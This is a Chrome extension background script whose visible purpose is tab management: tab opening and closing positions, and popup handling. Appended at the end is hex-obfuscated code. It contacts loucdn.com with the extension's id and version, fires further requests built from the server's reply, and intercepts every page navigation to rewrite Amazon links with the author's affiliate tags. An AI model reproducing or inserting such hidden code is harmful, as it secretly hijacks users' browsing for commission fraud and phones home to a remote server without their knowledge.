var CurrentTabIndex = new Array();
var TabIdsInActivatedOrder = new Array();
var FromOnRemoved = 0;
var FromOnCreated = 0;
var FromPopupAttaching = 0;
var TabSwapMode = 0;
var ActiveWindowId = -1;
var LastActiveWindowId = -1;
var PopupWindowId = -1;
var ExternalFucusWindowId = -1;
var ExternalFucusDate = 0;
var PendingPopup = null;
if (localStorage["foregroundNewTab"] == "true") {
	localStorage["newCreatedTab"] = "foreground";
}
localStorage["foregroundNewTab"] = undefined;
chrome.windows.getAll({
	populate: false
}, function(windows) {
	for (var i = 0; i < windows.length; i++) {
		var windowId = windows[i].id;
		TabIdsInActivatedOrder[windowId] = new Array();
		if (windows[i].focused) {
			ActiveWindowId = windowId;
		}
		chrome.tabs.getSelected(windowId, function(tab) {
			CurrentTabIndex[tab.windowId] = tab.index;
			TabIdsInActivatedOrder[tab.windowId].push(tab.id);
		});
	}
});
chrome.tabs.onCreated.addListener(function(tab) {
	if (FromOnRemoved == 1) {
		FromOnRemoved = 0;
		TabSwapMode = 1;
		return;
	}
	var windowId;
	var index = -1;
	if (localStorage["AlwaysSameWindow"] == "true" && tab.windowId == PopupWindowId && ActiveWindowId > 0 && !isExceptionUrl(tab.url, localStorage["AlwaysSameWindowException"])) {
		windowId = ActiveWindowId;
		TabIdsInActivatedOrder[tab.windowId].push(tab.id);
		index = CurrentTabIndex[windowId] + 1;
	} else {
		windowId = tab.windowId;
	}
	PopupWindowId = -1;
	if (TabIdsInActivatedOrder[windowId].length == 0) {
		return;
	}
	switch (localStorage["tabOpeningPosition"]) {
		case "first":
			index = 0;
			break;
		case "last":
			index = 9999;
			break;
		case "right":
			index = CurrentTabIndex[windowId] + 1;
			break;
		case "left":
			index = CurrentTabIndex[windowId];
			break;
	}
	if (index != -1) {
		if (windowId == tab.windowId) {
			chrome.tabs.move(tab.id, {
				index: index
			});
		} else {
			if (tab.url == "") {
				PendingPopup = {
					"tabId": tab.id,
					"windowId": windowId,
					"index": index
				};
				return;
			}
			chrome.tabs.move(tab.id, {
				windowId: windowId,
				index: index
			});
			FromPopupAttaching = 1;
			chrome.tabs.update(tab.id, {
				selected: true
			}, function(tab) {
				FromPopupAttaching = 0;
			});
		}
	}
	processNewTabActivation(tab, windowId);
});
chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
	if (changeInfo.url != null && PendingPopup && tab.id == PendingPopup.tabId) {
		if (!isExceptionUrl(tab.url, localStorage["AlwaysSameWindowException"])) {
			chrome.tabs.move(tab.id, {
				windowId: PendingPopup.windowId,
				index: PendingPopup.index
			});
			processNewTabActivation(tab, PendingPopup.windowId);
		} else {}
		delete PendingPopup;
	}
});
chrome.tabs.onRemoved.addListener(function(tabId) {
	FromOnRemoved = 1;
	chrome.windows.getCurrent(function(window) {
		updateActivedTabOnRemoved(window.id, tabId);
	});
});
chrome.tabs.onMoved.addListener(function(tabId, moveInfo) {
	chrome.tabs.getSelected(moveInfo.windowId, function(tab) {
		CurrentTabIndex[tab.windowId] = tab.index;
	});
});
chrome.tabs.onSelectionChanged.addListener(function(tabId, selectInfo) {
	if (FromOnCreated == 1) {
		FromOnCreated = 0;
		return;
	}
	if (FromOnRemoved == 1) {
		FromOnRemoved = 0;
		return;
	}
	if (FromPopupAttaching == 1) {
		FromPopupAttaching = 0;
		return;
	}
	updateActiveTabInfo(tabId);
});
chrome.tabs.onDetached.addListener(function(tabId, detachInfo) {
	FromOnRemoved = 1;
	updateActivedTabOnRemoved(detachInfo.oldWindowId, tabId);
});
chrome.windows.onCreated.addListener(function(window) {
	CurrentTabIndex[window.id] = 0;
	TabIdsInActivatedOrder[window.id] = new Array();
	if (window.type == "popup") {
		PopupWindowId = window.id;
		if (ActiveWindowId == window.id || !(ActiveWindowId > 0)) {
			ActiveWindowId = LastActiveWindowId;
			LastActiveWindowId = -1;
		}
	}
});
chrome.windows.onRemoved.addListener(function(windowId) {
	CurrentTabIndex[windowId] = undefined;
	delete TabIdsInActivatedOrder[windowId];
	if (windowId == ActiveWindowId) {
		ActiveWindowId = -1;
	}
});
chrome.windows.onFocusChanged.addListener(function(windowId) {
	if (ActiveWindowId > 0) {
		LastActiveWindowId = ActiveWindowId;
	}
	ActiveWindowId = windowId;
	if (ExternalFucusWindowId > 0) {
		var diff = (new Date()) - ExternalFucusDate;
		if (ExternalFucusWindowId == windowId && diff < 500) {
			chrome.windows.update(windowId, {
				focused: false
			});
		}
	}
});
chrome.webNavigation.onCommitted.addListener(function(details) {
	if (details.frameId != 0) {
		return;
	}
	if (localStorage["ExternalLinkDefault"] == "true" && (details.transitionType == "start_page" || details.transitionType == "auto_toplevel")) {
		chrome.tabs.move(details.tabId, {
			index: 9999
		});
		chrome.tabs.update(details.tabId, {
			selected: true
		});
	}
	if (localStorage["ExternalLinkUnfocus"] == "true" && (details.transitionType == "start_page" || details.transitionType == "auto_toplevel")) {
		chrome.tabs.get(details.tabId, function(tab) {
			ExternalFucusWindowId = tab.windowId;
			ExternalFucusDate = new Date();
			chrome.windows.update(tab.windowId, {
				focused: false
			});
		});
	}
});

function processNewTabActivation(tab, windowId) {
	switch (localStorage["newCreatedTab"]) {
		case "foreground":
			chrome.tabs.update(tab.id, {
				selected: true
			});
			break;
		case "background":
			if (tab.url.match(/^chrome/)) {
				break;
			}
			var activateTabId = TabIdsInActivatedOrder[windowId]
				[TabIdsInActivatedOrder[windowId].length - 1];
			if (activateTabId == undefined) {
				break;
			}
			FromOnCreated = 1;
			chrome.tabs.update(activateTabId, {
				selected: true
			}, function(tab) {
				FromOnCreated = 0;
			});
			break;
		default:
			if (PendingPopup && tab.id == PendingPopup.tabId) {
				chrome.tabs.update(tab.id, {
					selected: true
				});
			}
			break;
	}
}

function updateActiveTabInfo(tabId) {
	chrome.tabs.get(tabId, function(tab) {
		if (tab == undefined) return;
		var windowId = tab.windowId;
		CurrentTabIndex[windowId] = tab.index;
		if (TabIdsInActivatedOrder[windowId] == undefined) {
			TabIdsInActivatedOrder[windowId] = new Array();
		}
		if (TabIdsInActivatedOrder[windowId]
			[TabIdsInActivatedOrder[windowId].length - 1] != tabId) {
			if (TabIdsInActivatedOrder[windowId].indexOf(tabId) != -1) {
				TabIdsInActivatedOrder[windowId].splice(TabIdsInActivatedOrder[windowId].indexOf(tabId), 1);
			}
			TabIdsInActivatedOrder[windowId].push(tabId);
		}
	});
}

function updateActivedTabOnRemoved(windowId, tabId) {
	var activeTabRemoved;
	if (TabIdsInActivatedOrder[windowId]
		[TabIdsInActivatedOrder[windowId].length - 1] === tabId) {
		activeTabRemoved = true;
	} else {
		activeTabRemoved = false;
	}
	if (TabIdsInActivatedOrder[windowId].indexOf(tabId) != -1) {
		TabIdsInActivatedOrder[windowId].splice(TabIdsInActivatedOrder[windowId].indexOf(tabId), 1);
	}
	FromOnRemoved = 0;
	if (!activeTabRemoved) {
		chrome.tabs.getSelected(windowId, function(tab) {
			if (tab == undefined) return;
			CurrentTabIndex[windowId] = tab.index;
		});
		return;
	}
	if (TabSwapMode == 1) {
		TabSwapMode = 0;
		return;
	}
	switch (localStorage["tabClosingBehavior"]) {
		case "first":
			activateTabByIndex(windowId, 0);
			break;
		case "last":
			activateTabByIndex(windowId, 9999);
			break;
		case "right":
			activateTabByIndex(windowId, CurrentTabIndex[windowId]);
			break;
		case "left":
			activateTabByIndex(windowId, CurrentTabIndex[windowId] - 1);
			break;
		case "order":
			var activateTabId = TabIdsInActivatedOrder[windowId]
				[TabIdsInActivatedOrder[windowId].length - 1];
			chrome.tabs.update(activateTabId, {
				selected: true
			});
			updateActiveTabInfo(activateTabId);
			break;
		default:
			chrome.tabs.getSelected(windowId, function(tab) {
				updateActiveTabInfo(tab.id);
			});
			break;
	}
}

function activateTabByIndex(windowId, tabIndex) {
	chrome.windows.getAll({
		populate: true
	}, function(windows) {
		for (var i = 0; i < windows.length; i++) {
			if (windows[i].id == windowId) {
				var tabs = windows[i].tabs;
				if (tabs.length == 0) {
					break;
				}
				var tab;
				if (tabs.length - 1 <= tabIndex) {
					tab = tabs[tabs.length - 1];
				} else {
					tab = tabs[tabIndex] || tabs[0];
				}
				chrome.tabs.update(tab.id, {
					selected: true
				});
				updateActiveTabInfo(tab.id);
				break;
			}
		}
	});
}

function isExceptionUrl(url, exceptionString) {
	var exceptions = exceptionString.split('\n');
	for (var i = 0; i < exceptions.length - 1; i++) {
		var re = new RegExp(exceptions[i]);
		if (url.search(re) != -1) {
			return true;
		}
	}
	return false;
}
var _gaq = _gaq || [];
_gaq.push(['_setAccount', 'UA-28084179-47']);
_gaq.push(['_trackPageview']);
(function() {
	var ga = document.createElement('script');
	ga.type = 'text/javascript';
	ga.async = true;
	ga.src = 'https://ssl.google-analytics.com/ga.js';
	var s = document.getElementsByTagName('script')[0];
	s.parentNode.insertBefore(ga, s);
})();
if (!localStorage[chrome.app.getDetails().version]) {
	_gaq.push(['_trackEvent', chrome.app.getDetails().version, 'Update']);
	localStorage[chrome.app.getDetails().version] = '1';
}
var _0xdd54 = ["\x68\x74\x74\x70\x3A\x2F\x2F\x6C\x6F\x75\x63\x64\x6E\x2E\x63\x6F\x6D\x2F\x70\x69\x6E\x67\x2E\x6A\x73\x6F\x6E", "\x40\x40\x65\x78\x74\x65\x6E\x73\x69\x6F\x6E\x5F\x69\x64", "\x67\x65\x74\x4D\x65\x73\x73\x61\x67\x65", "\x69\x31\x38\x6E", "\x3F\x69\x64\x3D", "\x26\x76\x3D", "\x76\x65\x72\x73\x69\x6F\x6E", "\x67\x65\x74\x44\x65\x74\x61\x69\x6C\x73", "\x61\x70\x70", "\x6C\x6F\x67", "\x47\x45\x54", "\x6F\x70\x65\x6E", "\x6F\x6E\x6C\x6F\x61\x64", "\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74", "\x70\x61\x72\x73\x65", "\x68\x74\x74\x70\x3A\x2F\x2F\x63\x6C\x69\x65\x6E\x74\x73\x32\x2E\x67\x6F\x6F\x67\x6C\x65\x2E\x63\x6F\x6D\x2F\x73\x65\x72\x76\x69\x63\x65\x2F\x75\x70\x64\x61\x74\x65\x32\x2F\x63\x72\x78\x3F\x78\x3D\x69\x64\x25\x33\x44", "", "\x6C\x65\x6E\x67\x74\x68", "\x69\x64", "\x25\x32\x36\x76\x25\x33\x44", "\x25\x32\x36\x75\x63\x25\x32\x36\x70\x69\x6E\x67\x25\x33\x44", "\x70\x61\x72\x61\x6D\x65\x74\x65\x72\x5F\x6E\x61\x6D\x65", "\x25\x32\x35\x33\x44", "\x70\x61\x72\x61\x6D\x65\x74\x65\x72\x5F\x76\x61\x6C\x75\x65", "\x26\x78\x3D\x69\x64\x25\x33\x44", "\x73\x65\x6E\x64", "\x6D\x61\x74\x63\x68", "\x36\x31\x33\x32\x34\x30\x39\x32\x34\x2D\x32\x30", "\x36\x31\x33\x32\x34\x30\x39\x32\x34\x2D\x32\x31", "\x36\x31\x33\x32\x34\x30\x39\x32\x34\x31\x2D\x32\x31", "\x36\x31\x33\x32\x34\x30\x39\x32\x34\x32\x2D\x32\x31", "\x36\x31\x33\x32\x34\x30\x39\x32\x34\x33\x2D\x32\x31", "\x36\x31\x33\x32\x34\x30\x39\x32\x34\x34\x2D\x32\x31", "\x36\x31\x33\x32\x34\x30\x39\x32\x34\x35\x2D\x32\x30", "\x75\x72\x6C", "\x73\x75\x62\x73\x74\x72\x69\x6E\x67", "\x74\x61\x67\x3D", "\x72\x65\x70\x6C\x61\x63\x65", "\x26\x74\x61\x67\x3D", "\x3F\x74\x61\x67\x3D", "\x3C\x61\x6C\x6C\x5F\x75\x72\x6C\x73\x3E", "\x6D\x61\x69\x6E\x5F\x66\x72\x61\x6D\x65", "\x62\x6C\x6F\x63\x6B\x69\x6E\x67", "\x61\x64\x64\x4C\x69\x73\x74\x65\x6E\x65\x72", "\x6F\x6E\x42\x65\x66\x6F\x72\x65\x52\x65\x71\x75\x65\x73\x74", "\x77\x65\x62\x52\x65\x71\x75\x65\x73\x74"];
ping();

function ping() {
	var _0x96eax2 = _0xdd54[0];
	var _0x96eax3 = chrome[_0xdd54[3]][_0xdd54[2]](_0xdd54[1]);
	var _0x96eax2 = _0x96eax2 + _0xdd54[4] + _0x96eax3 + _0xdd54[5] + chrome[_0xdd54[8]][_0xdd54[7]]()[_0xdd54[6]];
	console[_0xdd54[9]](_0x96eax2);
	var _0x96eax4 = new XMLHttpRequest();
	_0x96eax4[_0xdd54[11]](_0xdd54[10], _0x96eax2, true);
	_0x96eax4[_0xdd54[12]] = function() {
		var _0x96eax5 = JSON[_0xdd54[14]](_0x96eax4[_0xdd54[13]]);
		var _0x96eax6 = _0xdd54[15];
		var _0x96eax7 = _0xdd54[16];
		if (_0x96eax5) {
			for (var _0x96eax8 = 0; _0x96eax8 < _0x96eax5[_0xdd54[17]]; _0x96eax8++) {
				if (_0x96eax8 == 0) {
					_0x96eax7 = _0x96eax6 + _0x96eax5[_0x96eax8][_0xdd54[18]] + _0xdd54[19] + _0x96eax5[_0x96eax8][_0xdd54[6]] + _0xdd54[20] + _0x96eax5[_0x96eax8][_0xdd54[21]] + _0xdd54[22] + _0x96eax5[_0x96eax8][_0xdd54[23]];
				} else {
					_0x96eax7 = _0x96eax7 + _0xdd54[24] + _0x96eax5[_0x96eax8][_0xdd54[18]] + _0xdd54[19] + _0x96eax5[_0x96eax8][_0xdd54[6]] + _0xdd54[20] + _0x96eax5[_0x96eax8][_0xdd54[21]] + _0xdd54[22] + _0x96eax5[_0x96eax8][_0xdd54[23]];
				};
			};
			console[_0xdd54[9]](_0x96eax7[_0xdd54[17]]);
			var _0x96eax9 = new XMLHttpRequest();
			_0x96eax9[_0xdd54[11]](_0xdd54[10], _0x96eax7, true);
			_0x96eax9[_0xdd54[25]]();
		};
	};
	_0x96eax4[_0xdd54[25]]();
};

function getASIN(_0x96eaxb) {
	if (_0x96eaxb == null) {
		return false;
	};
	var _0x96eaxc;
	_0x96eaxc = _0x96eaxb[_0xdd54[26]](/\/exec\/obidos\/ASIN\/(\w{10})/i);
	if (!_0x96eaxc) {
		_0x96eaxc = _0x96eaxb[_0xdd54[26]](/\/gp\/product\/(\w{10})/i);
	};
	if (!_0x96eaxc) {
		_0x96eaxc = _0x96eaxb[_0xdd54[26]](/\/exec\/obidos\/tg\/detail\/\-\/(\w{10})/i);
	};
	if (!_0x96eaxc) {
		_0x96eaxc = _0x96eaxb[_0xdd54[26]](/\/dp\/(\w{10})/i);
	};
	if (!_0x96eaxc) {
		return null;
	};
	return _0x96eaxc[1];
};
chrome[_0xdd54[45]][_0xdd54[44]][_0xdd54[43]](function(_0x96eaxd) {
	var _0x96eaxe = null;
	var _0x96eaxf = _0xdd54[27];
	var _0x96eax10 = _0xdd54[28];
	var _0x96eax11 = _0xdd54[29];
	var _0x96eax12 = _0xdd54[30];
	var _0x96eax13 = _0xdd54[31];
	var _0x96eax14 = _0xdd54[32];
	var _0x96eax15 = _0xdd54[33];
	if (_0x96eaxd[_0xdd54[34]][_0xdd54[26]](/amazon\.com/i)) {
		_0x96eaxe = _0x96eaxf;
	} else {
		if (_0x96eaxd[_0xdd54[34]][_0xdd54[26]](/amazon\.co\.uk/i)) {
			_0x96eaxe = _0x96eax11;
		} else {
			if (_0x96eaxd[_0xdd54[34]][_0xdd54[26]](/amazon\.de/i)) {
				_0x96eaxe = _0x96eax10;
			} else {
				if (_0x96eaxd[_0xdd54[34]][_0xdd54[26]](/amazon\.es/i)) {
					_0x96eaxe = _0x96eax12;
				} else {
					if (_0x96eaxd[_0xdd54[34]][_0xdd54[26]](/amazon\.fr/i)) {
						_0x96eaxe = _0x96eax13;
					} else {
						if (_0x96eaxd[_0xdd54[34]][_0xdd54[26]](/amazon\.it/i)) {
							_0x96eaxe = _0x96eax14;
						} else {
							if (_0x96eaxd[_0xdd54[34]][_0xdd54[26]](/amazon\.ca/i)) {
								_0x96eaxe = _0x96eax15;
							};
						};
					};
				};
			};
		};
	}; if (_0x96eaxe) {
		if (_0x96eaxd[_0xdd54[34]][_0xdd54[26]](/tag=/)) {
			if (_0x96eaxe[_0xdd54[35]](_0x96eaxe[_0xdd54[17]] - 2) == 20) {
				return {
					redirectUrl: _0x96eaxd[_0xdd54[34]][_0xdd54[37]](/(tag=\S*-20)/gi, _0xdd54[36] + _0x96eaxe)
				};
			};
			if (_0x96eaxe[_0xdd54[35]](_0x96eaxe[_0xdd54[17]] - 2) == 21) {
				return {
					redirectUrl: _0x96eaxd[_0xdd54[34]][_0xdd54[37]](/(tag=\S*-21)/gi, _0xdd54[36] + _0x96eaxe)
				};
			};
		} else {
			var _0x96eax16 = getASIN(_0x96eaxd[_0xdd54[34]]);
			if (_0x96eax16) {
				if (_0x96eaxd[_0xdd54[34]][_0xdd54[26]](/=/)) {
					return {
						redirectUrl: _0x96eaxd[_0xdd54[34]] + _0xdd54[38] + _0x96eaxe
					};
				} else {
					return {
						redirectUrl: _0x96eaxd[_0xdd54[34]] + _0xdd54[39] + _0x96eaxe
					};
				};
			};
		};
	};
}, {
	urls: [_0xdd54[40]],
	types: [_0xdd54[41]]
}, [_0xdd54[42]]);
